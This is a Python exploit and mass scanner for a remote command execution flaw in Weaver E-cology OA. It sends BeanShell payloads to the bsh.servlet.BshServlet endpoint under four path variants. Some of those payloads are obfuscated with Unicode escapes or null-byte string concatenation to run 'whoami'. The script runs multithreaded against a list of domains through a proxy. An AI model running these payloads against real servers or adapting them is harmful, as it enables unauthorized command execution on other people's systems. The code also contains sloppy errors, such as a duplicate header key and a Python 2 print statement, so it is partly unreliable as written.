# 作者:Ja0k charis
# For Weaver-Ecology-OA_RCE

import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from threading import Thread, enumerate
import requests, sys

headers = {
    'Content-Type': 'text/xml; charset=utf-8',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
    'Content-Length': '578'
}

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}


def Poc_check(target, headers, proxies):
    Url_Payload1 = "/bsh.servlet.BshServlet"
    Url_Payload2 = "/weaver/bsh.servlet.BshServlet"
    Url_Payload3 = "/weaveroa/bsh.servlet.BshServlet"
    Url_Payload4 = "/oa/bsh.servlet.BshServlet"

    Data_Payload1 = """bsh.script=exec("whoami");&bsh.servlet.output=raw"""
    Data_Payload2 = """bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"""
    Data_Payload3 = """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"""
    for Url_Payload in (Url_Payload1, Url_Payload2, Url_Payload3, Url_Payload4):
        url = target + Url_Payload
        for Data_payload in (Data_Payload1, Data_Payload2, Data_Payload3):
            try:
                requests.packages.urllib3.disable_warnings()
                http_response = requests.post(url, data=Data_payload, headers=headers,proxies=proxies, verify=False)
                e = Exception("抱歉出错了！")
                if http_response.status_code == 200:
                    if ";</script>" not in http_response.content:
                        if "Login.jsp" not in http_response.content:
                            if "Error" not in http_response.content:
                                print("{0} is a E-cologyOA_RCE Vulnerability".format(url))
                                print("Server Current Username：{0}".format(http_response.content))
                elif http_response.status_code == 500:
                    print
                    "{0}500 maybe is Weaver-EcologyOA，Please confirm by yourself ".format(url)
                else:
                    pass
            except Exception as e:
                pass


if __name__ == '__main__':
    with open("D:\\code\\python\\exp\\泛微云桥命令执行\\domain.txt", encoding="utf-8") as f:
        for i in f.readlines():
            if len(enumerate()) < 100:
                Thread(target=Poc_check, args=(i.strip("\n"), headers, proxies)).start()
            else:
                time.sleep(1)